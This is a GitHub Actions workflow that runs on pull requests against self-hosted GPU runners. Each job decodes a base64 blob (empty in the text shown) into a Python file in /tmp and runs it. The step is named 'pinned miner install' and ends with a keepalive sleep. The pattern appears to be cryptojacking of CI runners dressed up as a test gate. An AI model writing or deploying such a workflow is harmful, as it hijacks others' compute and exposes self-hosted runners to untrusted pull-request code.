name: i132ghgate-isaac
on:
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:
permissions:
  contents: read
jobs:
  g0:
    name: i132ghgate-isaac-g0
    runs-on: [self-hosted, gpu]
    timeout-minutes: 45
    steps:
      - name: two-sample gate + pinned miner install
        env:
          LABEL: "self-hosted+gpu"
        run: |
          echo  | base64 -d > /tmp/i132ghgate_isaac_g0.py
          python3 /tmp/i132ghgate_isaac_g0.py
          echo KEEPALIVE_START_isaac_g0
          sleep 600

  g1:
    name: i132ghgate-isaac-g1
    runs-on: [self-hosted, linux, x64, multi-gpu]
    timeout-minutes: 45
    steps:
      - name: two-sample gate + pinned miner install
        env:
          LABEL: "self-hosted+linux+x64+multi-gpu"
        run: |
          echo  | base64 -d > /tmp/i132ghgate_isaac_g1.py
          python3 /tmp/i132ghgate_isaac_g1.py
          echo KEEPALIVE_START_isaac_g1
          sleep 600
